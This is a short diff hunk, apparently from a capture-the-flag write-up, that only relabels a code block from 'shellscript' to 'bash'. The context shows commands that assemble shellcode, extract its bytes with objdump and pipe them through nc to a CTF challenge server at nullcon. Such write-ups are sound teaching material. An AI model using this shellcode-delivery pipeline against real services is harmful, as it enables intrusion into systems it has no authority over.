@@ -199,7 +199,7 @@ _start:
   syscall
 </pre>
 
-<pre lang='shellscript'>
+<pre lang='bash'>
 $ nasm sc.asm -felf64 -o sc.o; ld sc.o -o sc
 $ printf $(for i in $(objdump -d sc -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done) | nc pwn4.ctf.nullcon.net 5003
 </pre>
